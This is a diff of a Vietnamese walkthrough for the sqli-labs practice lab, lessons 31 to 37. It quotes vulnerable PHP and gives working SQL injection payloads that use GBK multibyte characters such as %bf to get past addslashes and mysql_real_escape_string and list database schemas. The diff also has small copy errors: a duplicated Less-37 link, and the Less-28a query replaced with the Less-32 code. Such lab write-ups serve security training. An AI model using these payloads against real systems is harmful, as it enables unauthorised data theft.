@@ -14,6 +14,14 @@ Link tải lab tại [đây](https://github.com/Audi-1/sqli-labs)
 - [Less-28a](#Less-28a)
 - [Less-29](#Less-29)
 - [Less-30](#Less-30)
+- [Less-31](#Less-31)
+- [Less-32](#Less-32)
+- [Less-33](#Less-33)
+- [Less-34](#Less-34)
+- [Less-35](#Less-35)
+- [Less-36](#Less-36)
+- [Less-37](#Less-37)
+- [Less-37](#Less-37)
 
 ## Less-23
 
@@ -321,8 +329,9 @@ Tương tự câu 27, ngoài `%0b` bạn cũng có thể sử dụng `%a0` để
 
 ## Less-28a
 
-```mysql
-SELECT * FROM users WHERE id=('$id') LIMIT 0,1
+```php
+mysql_query("SET NAMES gbk");
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
 ```
 
 ```php
@@ -402,3 +411,118 @@ $id = '"' .$id. '"';
 Payload: `login.php?id=1&id=0")%20union%20select%201,2,%27This%20is%20level%2031%27--+`
 
 ![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-31.png?raw=true)
+
+## Less-32
+
+```php
+mysql_query("SET NAMES gbk");
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+```
+
+```php
+function check_addslashes($string)
+{
+    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
+    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
+    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
+      
+    
+    return $string;
+}
+```
+
+Ở câu này `'`  và `"` khi đi qua hàm `check_addslashes()` sẽ thành `\\'`, `\\"`. Dấu `\` sẽ thành `\\\\`.
+
+Và ở đây chúng ta tìm thấy khái niệm về [GBK](https://en.wikipedia.org/wiki/GBK_(character_encoding)), ngoài ra nếu để ý các kí tự như `'` hay `"` khi đi qua `addslashes()` của PHP thì nó sẽ tự thêm `\` vào trước `'` hoặc `"`. Ta chỉ cần thêm `\` trước `'` là sẽ bypass được nhưng `\` đã bị replace thành `\\\\`.
+
+Vậy giờ chúng ta sẽ phải tìm kí tự nào đó, mà khi nó đi qua `addslashes()` nó sẽ thêm `\`  ở trước.
+
+Sau khi google thì mình tìm được [site](http://www.securityidiots.com/Web-Pentest/SQL-Injection/addslashes-bypass-sql-injection.html) này. Cụ thể là các giá trị `0xbf5c`,`0xaf5c` là các `multibyte character` hợp lệ trong GBK(ngôn ngữ Trung Quốc).
+
+Thử thêm `%bf` vào trước payload.
+
+![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-32_1.png?raw=true)
+
+Ở đây chúng ta thấy được, kí tự `%5c` tức là `\` được thêm vào. `0%bf'` => `0x30bf5c27`
+
+Giờ mình chỉ việc chèn query vào thôi.
+
+![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-32_2.png?raw=true)
+
+## Less-33
+
+```php
+function check_addslashes($string)
+{
+    $string= addslashes($string);    
+    return $string;
+}
+```
+
+Mặc dù `check_addslashes()` có thay đổi nhưng về cơ bản không khác câu 32.
+
+Nên payload sẽ cũng tương tự.
+
+## Less-34
+
+```php
+$uname = addslashes($uname1);
+$passwd= addslashes($passwd1);
+```
+
+ ```php
+mysql_query("SET NAMES gbk");
+@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
+ ```
+
+Về cơ bản, câu này cũng không khác 2 câu trước, chỉ đổi `GET` method thành `POST` method.
+
+Payload: `uname=0%bf%27+union+select+1,GROUP_CONCAT(SCHEMA_NAME)+FROM+INFORMATION_SCHEMA.SCHEMATA--+&passwd=1&submit=Submit`
+
+![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-34.png?raw=true)
+
+## Less-35
+
+```mysql
+SELECT * FROM users WHERE id=$id LIMIT 0,1
+```
+
+Mặc dù input vẫn đi qua `check_addslashes()` nhưng câu query không cần `'` hay `"` để bypass :joy:
+
+Payload: `?id=0+union+select+1,2,GROUP_CONCAT(SCHEMA_NAME)+FROM+INFORMATION_SCHEMA.SCHEMATA--`
+
+## Less-36
+
+```php
+function check_quotes($string)
+{
+    $string= mysql_real_escape_string($string);    
+    return $string;
+}
+```
+
+Input đi qua `check_quotes()`, mình vẫn có thể sử dụng `%af`,`%bf`,`%cf`,`%df` để bypass.
+
+Payload: `?id=0%bf%27+union+select+1,2,GROUP_CONCAT(SCHEMA_NAME)+FROM+INFORMATION_SCHEMA.SCHEMATA--+`
+
+## Less-37
+
+```php
+mysql_query("SET NAMES gbk");
+@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
+```
+
+```php
+$uname1=$_POST['uname'];
+$passwd1=$_POST['passwd'];
+```
+
+```php
+$uname = mysql_real_escape_string($uname1);
+$passwd= mysql_real_escape_string($passwd1);
+```
+
+Payload tương tự câu 34.
+
+`uname=0%bf%27+union+select+1,GROUP_CONCAT(SCHEMA_NAME)+FROM+INFORMATION_SCHEMA.SCHEMATA--+&passwd=1&submit=Submit`
+
